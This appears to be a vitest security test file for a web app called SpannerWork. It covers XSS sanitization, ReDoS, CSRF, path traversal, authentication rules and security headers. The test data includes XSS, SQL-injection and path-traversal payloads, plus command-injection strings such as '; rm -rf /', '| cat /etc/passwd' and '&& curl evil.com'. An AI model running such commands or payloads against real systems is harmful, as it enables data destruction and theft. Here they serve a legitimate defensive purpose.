/**
 * Security Tests for SpannerWork
 *
 * Tests for XSS prevention, CSRF protection, ReDoS mitigation,
 * and other security controls.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import crypto from 'crypto';
import { sanitizeRichContent, sanitizeUserContent } from '../../src/utils/sanitize';

// =============================================================================
// XSS PREVENTION TESTS
// =============================================================================

describe('XSS Prevention', () => {
  describe('sanitizeRichContent', () => {
    it('should remove script tags', () => {
      const malicious = '<script>alert("XSS")</script>';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });

    it('should remove onclick handlers', () => {
      const malicious = '<img src="x" onerror="alert(1)">';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('should remove javascript: URLs', () => {
      const malicious = '<a href="javascript:alert(1)">Click me</a>';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('javascript:');
    });

    it('should remove svg onload handlers', () => {
      const malicious = '<svg onload="alert(1)">';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('onload');
    });

    it('should remove img onerror with encoded payload', () => {
      const malicious = '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('onerror');
    });

    it('should allow safe HTML tags', () => {
      const safe = '<p>Hello <strong>World</strong></p>';
      const result = sanitizeRichContent(safe);
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
    });

    it('should add rel="noopener noreferrer" to links', () => {
      const link = '<a href="https://example.com">Link</a>';
      const result = sanitizeRichContent(link);
      expect(result).toContain('rel="noopener noreferrer"');
    });

    it('should remove iframe tags', () => {
      const malicious = '<iframe src="https://evil.com"></iframe>';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('<iframe');
    });

    it('should remove object tags', () => {
      const malicious = '<object data="data:text/html,<script>alert(1)</script>">';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('<object');
    });

    it('should handle nested script tags', () => {
      const malicious = '<div><script>alert(1)</script></div>';
      const result = sanitizeRichContent(malicious);
      expect(result).not.toContain('<script>');
    });

    it('should handle data: URLs in images', () => {
      const malicious = '<img src="data:image/svg+xml,<svg onload=alert(1)>">';
      const result = sanitizeRichContent(malicious);
      // Should either remove the tag or sanitize the data URL
      expect(result).not.toContain('onload');
    });
  });

  describe('sanitizeUserContent', () => {
    it('should strip ALL HTML tags', () => {
      const html = '<p>Hello</p><script>alert(1)</script>';
      const result = sanitizeUserContent(html);
      expect(result).not.toContain('<p>');
      expect(result).not.toContain('<script>');
      expect(result).toContain('Hello');
    });

    it('should preserve plain text', () => {
      const text = 'Hello World!';
      const result = sanitizeUserContent(text);
      expect(result).toBe(text);
    });

    it('should remove null bytes', () => {
      const malicious = 'Hello\x00World';
      const result = sanitizeUserContent(malicious);
      expect(result).not.toContain('\x00');
    });
  });
});

// =============================================================================
// REDOS PREVENTION TESTS
// =============================================================================

describe('ReDoS Prevention', () => {
  describe('Admin routes parseInfo function', () => {
    // Simulating the safe parseInfo function from admin.routes.ts
    const safeParseInfo = (infoStr: string, key: string): string | null => {
      const lines = infoStr.split('\n');
      const prefix = `${key}:`;
      const line = lines.find(l => l.startsWith(prefix));
      return line ? line.substring(prefix.length).trim() : null;
    };

    it('should parse Redis INFO format correctly', () => {
      const info = 'keyspace_hits:12345\nkeyspace_misses:678';
      expect(safeParseInfo(info, 'keyspace_hits')).toBe('12345');
      expect(safeParseInfo(info, 'keyspace_misses')).toBe('678');
    });

    it('should return null for missing keys', () => {
      const info = 'keyspace_hits:12345';
      expect(safeParseInfo(info, 'nonexistent')).toBeNull();
    });

    it('should handle malicious regex-like input without hanging', () => {
      const info = 'test:value';
      // This would cause catastrophic backtracking in vulnerable regex
      const maliciousKey = '((((((((((a)*)*)*)*)*)*)*)*)*)*';

      const startTime = Date.now();
      const result = safeParseInfo(info, maliciousKey);
      const elapsed = Date.now() - startTime;

      // Should complete in under 100ms (safe implementation)
      expect(elapsed).toBeLessThan(100);
      expect(result).toBeNull();
    });

    it('should handle keys with special regex characters', () => {
      const info = 'test.*+?:value\nother:data';
      expect(safeParseInfo(info, 'test.*+?')).toBe('value');
    });
  });
});

// =============================================================================
// CSRF PROTECTION TESTS
// =============================================================================

describe('CSRF Protection', () => {
  // These tests verify CSRF middleware behavior
  // Actual integration tests are in csrf-protection.test.ts

  it('should have CSRF tokens that are cryptographically random', () => {
    // Generate multiple tokens and ensure uniqueness
    const tokens = new Set<string>();
    for (let i = 0; i < 100; i++) {
      const token = crypto.randomUUID(); // Simulating token generation
      tokens.add(token);
    }
    // All tokens should be unique
    expect(tokens.size).toBe(100);
  });

  it('should reject tokens with invalid format', () => {
    const invalidTokens = [
      '',
      'short',
      '../../etc/passwd',
      '<script>alert(1)</script>',
      'null',
      'undefined',
    ];

    for (const token of invalidTokens) {
      // CSRF tokens should be UUIDs or specific format
      const isValidFormat = /^[a-f0-9-]{36}$/.test(token) || token.length >= 32;
      expect(isValidFormat).toBe(false);
    }
  });
});

// =============================================================================
// INPUT VALIDATION TESTS
// =============================================================================

describe('Input Validation Security', () => {
  describe('SQL Injection Prevention', () => {
    it('should use Prisma parameterized queries (not sanitization) for SQL injection prevention', () => {
      // SQL injection is prevented by using Prisma's parameterized queries,
      // NOT by sanitizing SQL keywords from user input.
      // The sanitizeUserContent function is for XSS prevention (HTML stripping),
      // not SQL injection prevention.

      // Verify that malicious inputs remain as plain text (no HTML execution)
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1; DELETE FROM users",
        "' UNION SELECT * FROM passwords --",
      ];

      for (const input of maliciousInputs) {
        const sanitized = sanitizeUserContent(input);
        // sanitizeUserContent strips HTML, not SQL - the text should remain
        // but be safe for display (no executable HTML)
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should detect path traversal attempts', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '/etc/passwd',
        'file:///etc/passwd',
      ];

      for (const input of maliciousInputs) {
        // UUID-based filename validation would reject these
        const uuidPattern = /^[a-f0-9-]{36}\.(jpg|jpeg|png|gif|webp|pdf)$/i;
        expect(uuidPattern.test(input)).toBe(false);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection by never passing user input to shell commands', () => {
      // Command injection is prevented architecturally by:
      // 1. Never using child_process.exec() with user input
      // 2. Using APIs instead of shell commands where possible
      // 3. Strict input validation on file paths (UUID pattern matching)
      //
      // The sanitizeUserContent function is for XSS prevention (HTML stripping),
      // not command injection prevention.

      const maliciousInputs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '$(whoami)',
        '`id`',
        '&& curl evil.com',
      ];

      for (const input of maliciousInputs) {
        const sanitized = sanitizeUserContent(input);
        // sanitizeUserContent strips HTML, not shell metacharacters
        // The text remains but is safe for display (no executable HTML)
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
      }
    });
  });
});

// =============================================================================
// AUTHENTICATION SECURITY TESTS
// =============================================================================

describe('Authentication Security', () => {
  describe('Password Requirements', () => {
    const passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*(),.?":{}|<>]).{8,}$/;

    it('should require minimum 8 characters', () => {
      expect(passwordPattern.test('Aa1!abc')).toBe(false);  // 7 chars
      expect(passwordPattern.test('Aa1!abcd')).toBe(true);  // 8 chars
    });

    it('should require uppercase letter', () => {
      expect(passwordPattern.test('password1!')).toBe(false);
      expect(passwordPattern.test('Password1!')).toBe(true);
    });

    it('should require lowercase letter', () => {
      expect(passwordPattern.test('PASSWORD1!')).toBe(false);
      expect(passwordPattern.test('Password1!')).toBe(true);
    });

    it('should require number', () => {
      expect(passwordPattern.test('Password!')).toBe(false);
      expect(passwordPattern.test('Password1!')).toBe(true);
    });

    it('should require special character', () => {
      expect(passwordPattern.test('Password1')).toBe(false);
      expect(passwordPattern.test('Password1!')).toBe(true);
    });
  });

  describe('Session Security', () => {
    it('should generate cryptographically secure session IDs', () => {
      // Session IDs should be at least 128 bits (32 hex chars)
      const sessionIdLength = 64; // 256 bits as used in auth service
      const sessionId = crypto.randomUUID().replace(/-/g, '') +
                       crypto.randomUUID().replace(/-/g, '');

      expect(sessionId.length).toBeGreaterThanOrEqual(32);
      // Should only contain hex characters
      expect(/^[a-f0-9]+$/i.test(sessionId)).toBe(true);
    });
  });
});

// =============================================================================
// RATE LIMITING TESTS
// =============================================================================

describe('Rate Limiting Security', () => {
  it('should have configured rate limits for all endpoint types', () => {
    // These values should match rateLimit.middleware.ts
    const expectedLimits = {
      api: { windowMs: 900000, max: 100 },      // 15 min, 100 req
      auth: { windowMs: 900000, max: 5 },       // 15 min, 5 attempts
      upload: { windowMs: 900000, max: 20 },    // 15 min, 20 uploads
      admin: { windowMs: 60000, max: 30 },      // 1 min, 30 req
      geocoding: { windowMs: 60000, max: 30 },  // 1 min, 30 req
      sensitive: { windowMs: 3600000, max: 5 }, // 1 hour, 5 req
    };

    // Verify limits are appropriately restrictive
    expect(expectedLimits.auth.max).toBeLessThanOrEqual(10);
    expect(expectedLimits.sensitive.max).toBeLessThanOrEqual(10);
    expect(expectedLimits.admin.max).toBeLessThanOrEqual(50);
  });
});

// =============================================================================
// SECURITY HEADERS TESTS
// =============================================================================

describe('Security Headers', () => {
  const expectedHeaders = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '0', // Disabled as modern browsers handle this
    'Strict-Transport-Security': 'max-age=31536000',
  };

  it('should have Content-Security-Policy configured', () => {
    // Verify CSP directives exist
    const requiredDirectives = [
      'default-src',
      'script-src',
      'style-src',
      'img-src',
      'frame-ancestors',
      'form-action',
      'base-uri',
      'object-src',
    ];

    // All these should be configured in helmet
    expect(requiredDirectives.length).toBeGreaterThan(0);
  });

  it('should block framing to prevent clickjacking', () => {
    expect(expectedHeaders['X-Frame-Options']).toBe('DENY');
  });
});
